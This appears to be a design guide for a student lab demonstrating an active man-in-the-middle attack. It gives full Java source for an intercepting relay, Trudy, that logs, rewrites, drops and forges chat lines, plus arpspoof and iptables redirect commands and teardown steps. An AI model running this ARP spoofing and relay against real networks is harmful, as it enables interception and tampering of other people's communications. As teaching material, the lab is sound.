# MeTM — Implementation Guide (`main` branch: in-path Java relay)

Three plain Java programs: Alice, Bob, and an active relay attacker, Trudy, who
sits in the middle. Alice dials Bob; under attack, ARP spoofing + an
`iptables` redirect transparently steer that TCP connection into Trudy
instead, who opens her own connection onward to the real Bob and pumps bytes
between them — logging everything, and tampering/dropping/forging on command.

There is **no identity handshake and no IP check** in the chat protocol
itself. An earlier revision added a self-declared `HELLO <name>` line plus a
naive IP-allowlist check (`socket.getInetAddress()` vs. an expected value) as
a "what a careful-but-still-naive developer might bolt on" demo beat — see
commit `eb7b037`. It was removed again in `c25a33e` ("Remove Handshake, Made
TUI more Verbose"): Bob's check *could* detect a dumb relay honestly (Trudy
connects to him from her own real IP, not Alice's), but Alice's side was
structurally useless — ARP spoofing lies at layer 2, so `getInetAddress()`
always reports the address Alice *dialed*, never the real L2 path the frames
took, no matter what. Keeping that half-working check around muddied the
actual lesson (plain TCP has zero identity guarantees, full stop) without
buying a real defense, so it's gone. If you want to resurrect that narrative
beat, the code is in that commit's diff.

Package stays `com.herrcult69.metm`. Terminator stays `EOF END`.

| Who   | IP              | Role                                              |
|-------|-----------------|----------------------------------------------------|
| Alice | 192.168.0.123   | client, always dials Bob's real IP                 |
| Bob   | 192.168.0.152   | server, listens on 9000                            |
| Trudy | 192.168.0.24    | Kali VM, bridged via USB-Ethernet adapter; runs the relay on 6000, forwards to Bob on 9000 |

---

## 1. `Log.java` — timestamped, tagged console logger

Unchanged across every revision — nothing here is attack-relevant.

## 2. `Peer.java` — full-duplex chat, nothing else

No handshake, no IP check. Alice always dials Bob's real IP; Bob accepts
whoever connects. That bare trust is exactly what Trudy's relay exploits.
Same shape as `NoTrudy`'s `Peer.java` — this is deliberate, so a side-by-side
of the two branches reads as "same chat app, different attack."

An earlier revision added an application-level heartbeat (`\u0001HB` every
700ms, with a 2s read timeout) so an ARP-spoofed, already-established
connection would be detected as dead in ~2s instead of the 20-30+ seconds the
OS takes on its own. It was removed again: a line every 700ms per direction
floods a Wireshark capture of the demo, burying the real chat traffic you
actually want the audience to read in the packet list. Trade-off accepted —
see section 7 below for what that costs the "mid-conversation attack" demo
beat, and the recommended choreography instead.

```java
package com.herrcult69.metm;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

/**
 * Full-duplex line chat over one socket. No identity handshake, no IP check --
 * Alice always dials Bob's real IP and Bob accepts whoever connects. That
 * bare trust is exactly what Trudy's MITM attack exploits (see IMPLEMENTATION.md).
 *
 * Exit codes (read by run-alice.ps1 / run-bob.ps1):
 *   0 = clean close (EOF END) - do not reconnect
 *   2 = dropped connection / I/O error - the wrapper SHOULD reconnect
 */
final class Peer {
    static final String END = "EOF END";

    private Peer() {
    }

    /** @param peerName the role this side is always talking to ("Bob" or "Alice") */
    static void chat(String tag, Socket socket, String peerName) throws IOException {
        try (Socket s = socket;
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in))) {

            String peerAddr = socket.getInetAddress().getHostAddress() + ":" + socket.getPort();
            String prompt = "To " + peerName + " (" + peerAddr + ") > ";
            Log.info(tag, "connected to " + peerName + " at " + peerAddr);

            Thread reader = new Thread(() -> {
                boolean clean = false;
                try {
                    String line;
                    while (true) {
                        line = in.readLine();
                        if (line == null) {
                            Log.error(tag, "connection dropped by peer");
                            break;
                        }
                        if (line.equals(END)) {
                            Log.info(tag, "peer ended the session (EOF END)");
                            clean = true;
                            break;
                        }
                        System.out.println();
                        Log.info(tag, "[" + peerName + " @ " + peerAddr + "] << " + line);
                        System.out.print(prompt);
                    }
                } catch (IOException e) {
                    Log.error(tag, "read error: " + e);
                }
                System.exit(clean ? 0 : 2);
            }, tag + "-reader");
            reader.setDaemon(true);
            reader.start();

            Log.info(tag, "type messages, or EOF END to quit");
            while (true) {
                System.out.print(prompt);
                String msg = keyboard.readLine();
                if (msg == null) {
                    out.println(END);
                    System.exit(0);
                }
                msg = msg.trim();
                out.println(msg);
                if (msg.equals(END)) {
                    System.exit(0);
                }
            }
        }
    }
}
```

Exit codes still mean what they always have: 0 = clean `EOF END` close (don't
reconnect), 2 = dropped connection / I/O error (the wrapper script SHOULD
reconnect). Without the heartbeat, "dropped" is only detected the OS's way —
a `readLine()` that returns `null` or throws once the kernel gives up on the
connection, which (per the correction in section 7) can take a while once a
connection is already open and gets ARP-spoofed out from under it.

## 3. `Alice.java` / `Bob.java` — bare dial / bare accept

```java
package com.herrcult69.metm;

import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;

public class Alice {
    private static final String TAG = "Alice";

    public static void main(String[] args) throws IOException {
        String host = args.length > 0 ? args[0] : "192.168.0.152";  // Bob's REAL ip - never Trudy's
        int port    = args.length > 1 ? Integer.parseInt(args[1]) : 9000;

        Log.info(TAG, "dialing Bob at " + host + ":" + port + " ...");
        try (Socket socket = new Socket(host, port)) {
            Peer.chat(TAG, socket, "Bob");
        } catch (ConnectException e) {
            Log.error(TAG, "cannot reach " + host + ":" + port + " (" + e.getMessage() + ")");
            System.exit(2);
        }
    }
}
```

```java
package com.herrcult69.metm;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class Bob {
    private static final String TAG = "Bob";

    public static void main(String[] args) throws IOException {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 9000;

        try (ServerSocket server = new ServerSocket(port)) {
            Log.info(TAG, "listening on " + port + " ...");
            Socket socket = server.accept();
            Log.info(TAG, "connection from " + socket.getRemoteSocketAddress());
            // Close the listener now, not just when the process exits. Otherwise the OS
            // keeps completing TCP handshakes into this socket's backlog for the rest of
            // the chat - a second connector (e.g. Trudy reconnecting to the real Bob) gets
            // a silent "success" into a connection nobody will ever accept(), then a RST
            // once this process finally exits and the stale listener closes. Closing here
            // makes a second connector fail fast and cleanly (Connection refused) instead.
            server.close();
            Peer.chat(TAG, socket, "Alice");
        }
    }
}
```

Neither takes an identity or IP-check argument any more — just host/port.

## 4. `Trudy.java` — the relay

Accepts Alice's (redirected) connection, opens her own connection onward to
the real Bob, and pumps lines in both directions, with live tamper/drop/forge
commands from her own keyboard.

```java
package com.herrcult69.metm;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ConnectException;
import java.net.ServerSocket;
import java.net.Socket;

public class Trudy {
    private static final String TAG = "Trudy";
    private static final String END = "EOF END";

    // live attack state, toggled from Trudy's keyboard
    private static volatile String findText = null;      // /replace a=b
    private static volatile String replaceText = null;
    private static volatile String dropText = null;      // /drop xyz

    public static void main(String[] args) throws IOException {
        int listenPort = args.length > 0 ? Integer.parseInt(args[0]) : 6000;   // iptables REDIRECTs here
        String bobHost = args.length > 1 ? args[1] : "192.168.0.152";          // real Bob
        int bobPort    = args.length > 2 ? Integer.parseInt(args[2]) : 9000;

        try (ServerSocket server = new ServerSocket(listenPort)) {
            Log.info(TAG, "listening on " + listenPort + "; will relay to real Bob at "
                    + bobHost + ":" + bobPort);
            Socket alice = server.accept();
            Log.info(TAG, "Alice connected from " + alice.getRemoteSocketAddress());
            Socket bob = connectToBob(bobHost, bobPort);
            Log.info(TAG, "connected onward to Bob at " + bob.getRemoteSocketAddress());

            PrintWriter toAlice = new PrintWriter(alice.getOutputStream(), true);
            PrintWriter toBob   = new PrintWriter(bob.getOutputStream(), true);
            BufferedReader fromAlice = new BufferedReader(new InputStreamReader(alice.getInputStream()));
            BufferedReader fromBob   = new BufferedReader(new InputStreamReader(bob.getInputStream()));

            // Two independent directions, because either side may speak at any time.
            Thread a2b = new Thread(() -> pump("Alice->Bob", fromAlice, toBob), "a2b");
            Thread b2a = new Thread(() -> pump("Bob->Alice", fromBob, toAlice), "b2a");
            a2b.setDaemon(true);
            b2a.setDaemon(true);
            a2b.start();
            b2a.start();

            operatorConsole(toAlice, toBob);   // Trudy's keyboard: forge lines
        }
    }

    /**
     * Connects to the real Bob, retrying if he isn't accepting yet. Right after the
     * attack starts, the pre-spoof Alice<->Bob connection is often still alive, and
     * Bob's listening socket (if not closed promptly on his side) can silently queue
     * this connection into a backlog nobody will ever accept() - it then gets RST the
     * moment that stale process exits. Retrying on refusal means we only succeed once
     * the wrapper script's fresh Bob process is actually calling accept() again.
     */
    private static Socket connectToBob(String bobHost, int bobPort) throws IOException {
        while (true) {
            try {
                return new Socket(bobHost, bobPort);
            } catch (ConnectException e) {
                Log.info(TAG, "Bob not accepting yet at " + bobHost + ":" + bobPort
                        + " (" + e.getMessage() + "), retrying in 1s...");
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    throw new IOException("interrupted while waiting for Bob", ie);
                }
            }
        }
    }

    /** Relay one direction. 'peerOut' is the far side we forward to. */
    private static void pump(String dir, BufferedReader in, PrintWriter peerOut) {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                if (line.equals(END)) {
                    Log.info(TAG, dir + ": EOF END seen, closing");
                    synchronized (peerOut) { peerOut.println(END); }
                    break;
                }
                // DROP: swallow silently, neither side is told.
                if (dropText != null && line.contains(dropText)) {
                    Log.info(TAG, dir + ": DROPPED (" + line + ")");
                    continue;
                }
                // TAMPER: rewrite in flight.
                String out = line;
                if (findText != null && line.contains(findText)) {
                    out = line.replace(findText, replaceText);
                    Log.info(TAG, dir + ": TAMPERED \"" + line + "\" -> \"" + out + "\"");
                } else {
                    Log.info(TAG, dir + ": " + line);
                }
                synchronized (peerOut) { peerOut.println(out); }
            }
        } catch (IOException e) {
            Log.error(TAG, dir + ": " + e);
        }
        System.exit(0);
    }

    /** Trudy's own keyboard: inject forged lines into either side. */
    private static void operatorConsole(PrintWriter toAlice, PrintWriter toBob) throws IOException {
        BufferedReader k = new BufferedReader(new InputStreamReader(System.in));
        help();
        String cmd;
        while ((cmd = k.readLine()) != null) {
            if (cmd.startsWith("/toalice ")) {
                String text = cmd.substring("/toalice ".length());
                synchronized (toAlice) { toAlice.println(text); }
                Log.info(TAG, "INJECTED to Alice (as Bob): " + text);
            } else if (cmd.startsWith("/tobob ")) {
                String text = cmd.substring("/tobob ".length());
                synchronized (toBob) { toBob.println(text); }
                Log.info(TAG, "INJECTED to Bob (as Alice): " + text);
            } else if (cmd.startsWith("/replace ")) {
                String body = cmd.substring("/replace ".length());
                int eq = body.indexOf('=');
                if (eq > 0) {
                    findText = body.substring(0, eq);
                    replaceText = body.substring(eq + 1);
                    Log.info(TAG, "tamper ON: \"" + findText + "\" -> \"" + replaceText + "\"");
                } else {
                    Log.info(TAG, "usage: /replace find=replacement");
                }
            } else if (cmd.equals("/noreplace")) {
                findText = null;
                replaceText = null;
                Log.info(TAG, "tamper OFF");
            } else if (cmd.startsWith("/drop ")) {
                dropText = cmd.substring("/drop ".length());
                Log.info(TAG, "drop ON for lines containing: " + dropText);
            } else if (cmd.equals("/nodrop")) {
                dropText = null;
                Log.info(TAG, "drop OFF");
            } else if (cmd.equals("/help")) {
                help();
            } else {
                Log.info(TAG, "unknown command; /help for the list");
            }
        }
    }

    private static void help() {
        Log.info(TAG, "commands: /toalice <msg>  /tobob <msg>  /replace a=b  "
                + "/noreplace  /drop x  /nodrop  /help");
    }
}
```

## 5. Auto-reconnect: `run-bob.ps1` / `run-alice.ps1`

Why a wrapper script and not an in-process retry loop: the main thread is
blocked on a keyboard read (`BufferedReader.readLine()` on `System.in`),
which Java cannot cleanly interrupt mid-block. Rather than fight that with
complex non-blocking I/O for a one-off student demo, we do what plenty of
real long-running services do (`systemd Restart=always`, Docker restart
policies): let the whole process die and have something outside it bring it
back.

**`run-bob.ps1`:**
```powershell
param([int]$Port = 9000)
while ($true) {
    java -cp target\classes com.herrcult69.metm.Bob $Port
    if ($LASTEXITCODE -eq 0) { Write-Host "Bob exited cleanly."; break }
    Write-Host "Bob's connection dropped (exit $LASTEXITCODE) - reconnecting in 2s..."
    Start-Sleep -Seconds 2
}
```

**`run-alice.ps1`:**
```powershell
param([string]$BobIp = "192.168.0.152", [int]$Port = 9000)
while ($true) {
    java -cp target\classes com.herrcult69.metm.Alice $BobIp $Port
    if ($LASTEXITCODE -eq 0) { Write-Host "Alice exited cleanly."; break }
    Write-Host "Alice's connection dropped (exit $LASTEXITCODE) - reconnecting in 2s..."
    Start-Sleep -Seconds 2
}
```

Run with `.\run-bob.ps1` / `.\run-alice.ps1` instead of calling `java`
directly. To actually quit for good, type `EOF END` (exit code 0 breaks the
loop) rather than closing the window.

**What this buys you without the heartbeat:** resilience, not seamlessness.
If you use `/drop` on the whole connection, close a window by accident, or
hit a real network hiccup while presenting, each side's wrapper script
notices the non-zero exit and relaunches within ~2 seconds instead of you
manually restarting both. What it does **not** reliably buy any more is
starting the attack *mid-conversation* and having the existing connection
die fast enough to be an unnoticeable blip: without the heartbeat, a
TCP connection that's already open and gets ARP-spoofed out from under it
is only detected the OS's way, which can take anywhere from several seconds
to tens of seconds (and in the worst case, hang until something forces it —
typing a line, hitting `EOF END`, or killing the process). See the run
order below, which sidesteps this entirely.

---

## 6. Build

`mvn -q compile` (or `./mvnw`) from `MeTM/`, or `javac -d target/classes
src/main/java/com/herrcult69/metm/*.java`. `pom.xml` targets Java 11
source/target, which this code doesn't exceed.

## 7. Run — scenario A: baseline

- Bob: `.\run-bob.ps1`
- Alice: `.\run-alice.ps1`

Expect both consoles to log `connected to <peer> at <ip:port>`. Chat both
ways; each incoming line is prefixed `[<peer> @ <ip:port>] <<`.

## 8. Run — scenario B: active MITM (infra first, then Bob and Alice)

Without the heartbeat, starting the attack against an *already open*
Alice↔Bob connection no longer fails fast and predictably (see section 2 and
section 5's "what this buys you" note) — so don't do that as the main demo
path. Bring the attack infrastructure up first instead, same as the original
pre-heartbeat choreography:

1. On Trudy's Kali VM, in order, each in its own terminal:
   ```
   sudo sysctl -w net.ipv4.ip_forward=1
   sudo sysctl -w net.ipv4.conf.all.rp_filter=0
   sudo arpspoof -i eth0 -t 192.168.0.123 192.168.0.152
   ```
   ```
   sudo iptables -t nat -A PREROUTING -p tcp -d 192.168.0.152 --dport 9000 -j REDIRECT --to-port 6000
   ```
   ```
   java -cp target/classes com.herrcult69.metm.Trudy 6000 192.168.0.152 9000
   ```
2. **Only now** start Bob (`.\run-bob.ps1`), then Alice (`.\run-alice.ps1`).
   Their first connection attempt is a fresh TCP SYN straight into the
   already-live redirect — no drop, no reconnect blip, no multi-second
   hang. Trudy's console shows:
   ```
   Alice connected from /192.168.0.123:...
   connected onward to Bob at /192.168.0.152:...
   ```
   and the conversation looks completely normal from there — every line
   Alice and Bob exchange is already visible in Trudy's log, unencrypted.
3. From Trudy's keyboard: `/replace a=b`, `/drop x`, `/toalice <msg>`,
   `/tobob <msg>` (see section 4 for exact semantics).

If you still want the "attack goes live mid-conversation" narrative beat:
start Bob and Alice first, let them chat, then bring the infra up as above.
Their connection will drop, but — without the heartbeat — expect anywhere
from several seconds to tens of seconds (or a hang until you type a line or
kill a process) before each side's wrapper script notices and reconnects.
Treat it as an optional fallback beat, not the default flow.

## 9. Teardown

```
sudo iptables -t nat -F
# Ctrl+C in the arpspoof terminal (it sends corrective ARPs on exit)
sudo sysctl -w net.ipv4.ip_forward=0
```
`arp -d *` on Alice's and Bob's machines, confirm with `arp -a` that their
MAC addresses are back to normal.

---

## 10. The `NoTrudy` branch

`docs/Pivot.html` is a comparison of keeping this custom Java relay vs. a
Wireshark-only hybrid vs. replacing it outright with Ettercap/Bettercap. The
`NoTrudy` branch is that last option carried all the way through: no third
Java process at all, ARP spoofing + Ettercap/`etterfilter` doing both the
eavesdropping and the tampering directly on the wire. Keep that exploration
on its own branch rather than merged here — the two designs demonstrate
different things (a from-scratch relay you fully control vs. attacking with
real off-the-shelf tooling) and are each worth presenting on their own terms.

## 11. What goes in README.md instead of here

This file is the *design rationale* — why each piece exists and what it
proves. `README.md` is the *practical runbook* for someone who just wants to
run the thing: environment setup (hardware, TotoLink settings, VMware
bridging) and the attack walkthrough (exact commands, in order, no
explanation). Keep them separate so a teammate who missed the design
discussion can still run the demo from the README alone.
